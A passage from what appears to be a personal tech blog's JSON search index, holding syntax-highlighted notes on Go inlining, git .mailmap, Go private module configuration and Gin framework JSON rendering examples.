style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u0026lt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eadd\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003esub\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ev\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eadd\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esub\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efloat32\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用参数\u003ccode\u003e-gflags=\u0026quot;-m\u0026quot;\u003c/code\u003e运行，可显示被内联的函数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./op.go:3:6: can inline add\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./op.go:7:6: can inline sub\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./main.go:16:11: inlining call to sub\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./main.go:14:11: inlining call to add\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./main.go:7:12: inlining call to fmt.Printf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到 add 方法被内联了。但是，为什么 sum 方法没有被内联呢？使用运行参数\u003ccode\u003e-gflags=\u0026quot;-m -m\u0026quot;\u003c/code\u003e可以看到原因：\u003c/p\u003e","tags":["URL","Go"],"title":"[译] Go语言inline内联的策略与限制"},{"categories":["URL","SQL"],"contents":" SQL Join types explained visually ","date":"August 13, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210813-sql-join-types-explained-visually/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dataschool.com/how-to-teach-people-sql/sql-join-types-explained-visually/\" target=\"_blank\" rel=\"noopener\"\u003eSQL Join types explained visually\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","SQL"],"title":"SQL Join types explained visually"},{"categories":["URL","Git"],"contents":" Little Git Tricks: Use .mailmap to Merge Different Authors .mailmap file ==\u0026gt; Name you want to keep \u0026lt;email\u0026gt; Name you no longer want \u0026lt;email\u0026gt;\nJohn Doe John Doe John Doe John Doe John Doe john doe Max Example Max before $ git shortlog -se 1 John Doe \u0026lt;John@Doe.org\u0026gt; 1 John Doe \u0026lt;John@doe.org\u0026gt; 2 John Doe \u0026lt;john@doe.org\u0026gt; 1 Max \u0026lt;max@test.co.uk\u0026gt; 3 Max Example \u0026lt;hi@test.com\u0026gt; 1 john doe \u0026lt;john@doe.org\u0026gt; after $ git shortlog -se 5 John Doe \u0026lt;john@doe.org\u0026gt; 4 Max Example \u0026lt;hi@test.com\u0026gt; ","date":"August 5, 2021","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210805-little-git-tricks-use-mailmap-to-merge-different-authors/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://improveandrepeat.com/2019/06/little-git-tricks-use-mailmap-to-merge-different-authors/\" target=\"_blank\" rel=\"noopener\"\u003eLittle Git Tricks: Use .mailmap to Merge Different Authors\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003e.mailmap\u003c/code\u003e file ==\u0026gt; \u003ccode\u003eName you want to keep \u0026lt;email\u0026gt; Name you no longer want \u0026lt;email\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eJohn Doe  John Doe\nJohn Doe  John Doe\nJohn Doe  john doe\nMax Example  Max\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"before\"\u003ebefore\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ git shortlog -se\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e  John Doe \u0026lt;John@Doe.org\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e  John Doe \u0026lt;John@doe.org\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e  John Doe \u0026lt;john@doe.org\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e  Max \u0026lt;max@test.co.uk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e  Max Example \u0026lt;hi@test.com\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e  john doe \u0026lt;john@doe.org\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"after\"\u003eafter\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ git shortlog -se\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e  John Doe \u0026lt;john@doe.org\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e  Max Example \u0026lt;hi@test.com\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Git"],"title":"Little Git Tricks: Use .mailmap to Merge Different Authors"},{"categories":["URL","Go"],"contents":" Go Modules 處理 Private GIT Repository 流程 go env -w GOPRIVATE=github.com/appleboy go env -w GONOPROXY=github.com/appleboy go env -w GONOSUMDB=github.com/appleboy git config --global url.\u0026quot;https://$USERNAME:$ACCESS_TOKEN@github.com\u0026quot;.insteadOf \u0026quot;https://github.com\u0026quot; git config --global url.ssh://git@your.private.git/.insteadOf https://your.private.git/ ","date":"July 23, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210723-read-private-module-in-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.wu-boy.com/2020/03/read-private-module-in-golang/\" target=\"_blank\" rel=\"noopener\"\u003eGo Modules 處理 Private GIT Repository 流程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003ego env -w GOPRIVATE=github.com/appleboy\u003c/code\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003ego env -w GONOPROXY=github.com/appleboy\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ego env -w GONOSUMDB=github.com/appleboy\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egit config --global url.\u0026quot;https://$USERNAME:$ACCESS_TOKEN@github.com\u0026quot;.insteadOf \u0026quot;https://github.com\u0026quot;\u003c/code\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003egit config --global url.ssh://git@your.private.git/.insteadOf https://your.private.git/\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Go"],"title":"Go Modules 處理 Private GIT Repository 流程"},{"categories":["URL","Go","Gin"],"contents":" 自定义路由日志的格式 Gin 运行多个服务 XML、JSON、YAML 和 ProtoBuf 渲染（输出格式） 自定义路由日志的格式 default\n[GIN-debug] POST /foo --\u0026gt; main.main.func1 (3 handlers) [GIN-debug] GET /bar --\u0026gt; main.main.func2 (3 handlers) [GIN-debug] GET /status --\u0026gt; main.main.func3 (3 handlers) import ( \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; ) func main() { r := gin.Default() gin.DebugPrintRouteFunc = func(httpMethod, absolutePath, handlerName string, nuHandlers int) { log.Printf(\u0026#34;endpoint %v %v %v %v\\n\u0026#34;, httpMethod, absolutePath, handlerName, nuHandlers) } r.POST(\u0026#34;/foo\u0026#34;, func(c *gin.Context) { c.JSON(http.StatusOK, \u0026#34;foo\u0026#34;) }) r.GET(\u0026#34;/bar\u0026#34;, func(c *gin.Context) { c.JSON(http.StatusOK, \u0026#34;bar\u0026#34;) }) r.GET(\u0026#34;/status\u0026#34;, func(c *gin.Context) { c.JSON(http.StatusOK, \u0026#34;ok\u0026#34;) }) // Listen and Server in http://0.0.0.0:8080 r.Run() } Gin 运行多个服务 package main import ( \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;golang.org/x/sync/errgroup\u0026#34; ) var ( g errgroup.Group ) func router01() http.Handler { e := gin.New() e.Use(gin.Recovery()) e.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.JSON( http.StatusOK, gin.H{ \u0026#34;code\u0026#34;: http.StatusOK, \u0026#34;error\u0026#34;: \u0026#34;Welcome server 01\u0026#34;, }, ) }) return e } func router02() http.Handler { e := gin.New() e.Use(gin.Recovery()) e.GET(\u0026#34;/\u0026#34;, func(c *gin.Context) { c.JSON( http.StatusOK, gin.H{ \u0026#34;code\u0026#34;: http.StatusOK, \u0026#34;error\u0026#34;: \u0026#34;Welcome server 02\u0026#34;, }, ) }) return e } func main() { server01 := \u0026amp;http.Server{ Addr: \u0026#34;:8080\u0026#34;, Handler: router01(), ReadTimeout: 5 * time.Second, WriteTimeout: 10 * time.Second, } server02 := \u0026amp;http.Server{ Addr: \u0026#34;:8081\u0026#34;, Handler: router02(), ReadTimeout: 5 * time.Second, WriteTimeout: 10 * time.Second, } g.Go(func() error { return server01.ListenAndServe() }) g.Go(func() error { return server02.ListenAndServe() }) if err := g.Wait(); err != nil { log.Fatal(err) } } XML、JSON、YAML 和 ProtoBuf 渲染（输出格式） SecureJSON 使用 SecureJSON 可以防止 json 劫持，如果返回的数据是数组，则会默认在返回值前加上\u0026quot;while(1)\u0026quot;\nfunc main() { r := gin.Default() // 可以自定义返回的json数据前缀 // r.SecureJsonPrefix(\u0026#34;)]}\u0026#39;,\\n\u0026#34;) r.GET(\u0026#34;/someJSON\u0026#34;, func(c *gin.Context) { names := []string{\u0026#34;lena\u0026#34;, \u0026#34;austin\u0026#34;, \u0026#34;foo\u0026#34;} // 将会输出: while(1);[\u0026#34;lena\u0026#34;,\u0026#34;austin\u0026#34;,\u0026#34;foo\u0026#34;] c.SecureJSON(http.StatusOK, names) }) // Listen and serve on 0.0.0.0:8080 r.Run(\u0026#34;:8080\u0026#34;) } JSONP 使用 JSONP 可以跨域传输，如果参数中存在回调参数，那么返回的参数将是回调函数的形式\nfunc main() { r := gin.Default() r.GET(\u0026#34;/JSONP\u0026#34;, func(c *gin.Context) { data := map[string]interface{}{ \u0026#34;foo\u0026#34;: \u0026#34;bar\u0026#34;, } // 访问 http://localhost:8080/JSONP?callback=call // 将会输出: call({foo:\u0026#34;bar\u0026#34;}) c.JSONP(http.StatusOK, data) }) // Listen and serve on 0.0.0.0:8080 r.Run(\u0026#34;:8080\u0026#34;) } AsciiJSON 使用 AsciiJSON 将使特殊字符编码\nfunc main() { r := gin.Default() r.GET(\u0026#34;/someJSON\u0026#34;, func(c *gin.Context) { data := map[string]interface{}{ \u0026#34;lang\u0026#34;: \u0026#34;GO语言\u0026#34;, \u0026#34;tag\u0026#34;: \u0026#34;\u0026lt;br\u0026gt;\u0026#34;, } // 将输出: {\u0026#34;lang\u0026#34;:\u0026#34;GO\\u8bed\\u8a00\u0026#34;,\u0026#34;tag\u0026#34;:\u0026#34;\\u003cbr\\u003e\u0026#34;} c.AsciiJSON(http.StatusOK, data) }) // Listen and serve on 0.0.0.0:8080 r.Run(\u0026#34;:8080\u0026#34;) } PureJSON 通常情况下，JSON 会将特殊的 HTML 字符替换为对应的 unicode 字符，比如\u0026lt;替换为\\u003c，如果想原样输出 html，则使用 PureJSON，这个特性在Go 1.6及以下版本中无法使用。\nfunc main() { r := gin.Default() // Serves unicode entities r.GET(\u0026#34;/json\u0026#34;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026#34;html\u0026#34;: \u0026#34;\u0026lt;b\u0026gt;Hello, world!\u0026lt;/b\u0026gt;\u0026#34;, }) }) // Serves literal characters r.GET(\u0026#34;/purejson\u0026#34;, func(c *gin.Context) { c.PureJSON(200, gin.H{ \u0026#34;html\u0026#34;: \u0026#34;\u0026lt;b\u0026gt;Hello, world!\u0026lt;/b\u0026gt;\u0026#34;, }) }) // listen and serve on 0.0.0.0:8080 r.Run(\u0026#34;:8080\u0026#34;) } ","date":"July 22, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210722-shuangdeyu-gin-book/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.kancloud.cn/shuangdeyu/gin_book/949450\" target=\"_blank\" rel=\"noopener\"\u003e自定义路由日志的格式\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.kancloud.cn/shuangdeyu/gin_book/949444\" target=\"_blank\" rel=\"noopener\"\u003eGin 运行多个服务\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.kancloud.cn/shuangdeyu/gin_book/949433\" target=\"_blank\" rel=\"noopener\"\u003eXML、JSON、YAML 和 ProtoBuf 渲染（输出格式）\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"自定义路由日志的格式\"\u003e自定义路由日志的格式\u003c/h3\u003e\n\u003cp\u003edefault\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eGIN-debug\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e POST   /foo                      --\u0026gt; main.main.func1 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e handlers\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eGIN-debug\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e GET    /bar                      --\u0026gt; main.main.func2 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e handlers\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eGIN-debug\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e GET    /status                   --\u0026gt; main.main.func3 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e handlers\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;net/http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/gin-gonic/gin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDefault\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDebugPrintRouteFunc\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehttpMethod\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eabsolutePath\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ehandlerName\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003enuHandlers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;endpoint %v %v %v %v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ehttpMethod\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eabsolutePath\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ehandlerName\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003enuHandlers\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePOST\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/foo\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGET\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/bar\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bar\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGET\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/status\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egin\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStatusOK\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ok\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// Listen and Server in http://0.0.0.0:8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRun\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"gin-运行多个服务\"\u003eGin 运行多个服务\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan 